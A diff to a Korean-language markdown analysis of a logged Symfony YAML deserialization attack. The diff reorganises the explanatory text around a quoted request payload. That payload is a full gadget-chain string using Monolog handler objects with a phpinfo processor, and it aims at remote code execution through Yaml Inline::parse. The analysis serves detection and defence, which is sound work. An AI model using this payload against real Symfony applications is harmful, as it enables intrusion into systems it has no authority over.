@@ -6,15 +6,13 @@
 
 ---
 ### 1) Symfony YAML deserialization RCE 시도
-(과거 취약점 CVE-2019-… / CVE-2022-… 등에서 반복적으로 등장하는 패턴)
+"Symfony YAML parser에게 PHP 오브젝트를 강제로 언시리얼라이즈시켜 RCE를 유발하는 공격"
 
 ```
 controller\=SymfonyComponentYamlInline::parse&value\=!!php/object:a:1:{i:1;a:2:{i:0;O:32:\"MonologHandlerSyslogUdpHandler\":1:{s:9:\"*socket\";O:29:\"MonologHandlerBufferHandler\":7:{s:10:\"*handler\";O:29:\"MonologHandlerBufferHandler\":7:{s:10:\"*handler\";N;s:13:\"*bufferSize\";i:-1;s:9:\"*buffer\";a:1:{i:0;a:2:{i:0;s:2:\"-1\";s:5:\"level\";N;}}s:8:\"*level\";N;s:14:\"*initialized\";b:1;s:14:\"*bufferLimit\";i:-1;s:13:\"*processors\";a:2:{i:0;s:7:\"current\";i:1;s:7:\"phpinfo\";}}s:13:\"*bufferSize\";i:-1;s:9:\"*buffer\";a:1:{i:0;a:2:{i:0;i:-1;s:5:\"level\";N;}}s:8:\"*level\";N;s:14:\"*initialized\";b:1;s:14:\"*bufferLimit\";i:-1;s:13:\"*processors\";a:2:{i:0;s:7:\"current\";i:1;s:7:\"phpinfo\";}}}i:0;i:0;}}&exceptionOnInvalidType\=0&objectSupport\=1&objectForMap\=0&flags\777215&references\=1
 ```
 
 #### 📌 분석
-
-> "Symfony YAML parser에게 PHP 오브젝트를 강제로 언시리얼라이즈시켜 RCE를 유발하는 공격"
 
 > Symfony YAML parser가 외부 입력을 그대로 `Yaml::parse()` 또는 `YamlInline::parse()` 에 넘기는 취약 서비스로,  즉 **YAML 파서에게 PHP 객체 태그를 허용하라는 옵션과, 그 PHP 객체 데이터 자체를 넘기는 시도**입니다.
 
@@ -25,15 +23,12 @@ value=!!php/object: a:1:{ … MonologHandler … phpinfo … }
 
 * `_controller=SymfonyComponentYamlInline::parse` 로 보아 Symfony의 `Yaml\Inline::parse()`를 호출하는 맥락이고, `value=` 에는 `!!php/object:...` 형태의 **PHP 직렬화된(또는 PHP 객체 표기) 데이터**가 들어 있습니다.
 *  이어서 `exceptionOnInvalidType=0`, `objectSupport=1` 등 파싱 옵션도 함께 전달되고 있습니다.
+* Monolog Handler 객체 체인이 특징적입니다.
+  * `MonologHandlerSyslogUdpHandler`
+  * `MonologHandlerBufferHandler`
+  * `phpinfo`
 
-
-Monolog Handler 객체 체인이 특징적입니다.
-
-* `MonologHandlerSyslogUdpHandler`
-* `MonologHandlerBufferHandler`
-* `phpinfo`
-
-이 구조는 **gadget chain** (PHP 객체 직렬화 악용 체인)을 구성하여 실행 가능한 메서드가 트리거되는지 테스트하는 공격입니다.
+➡️ 이 구조는 **gadget chain** (PHP 객체 직렬화 악용 체인)을 구성하여 실행 가능한 메서드가 트리거되는지 테스트하는 공격입니다.
 
 ---
 
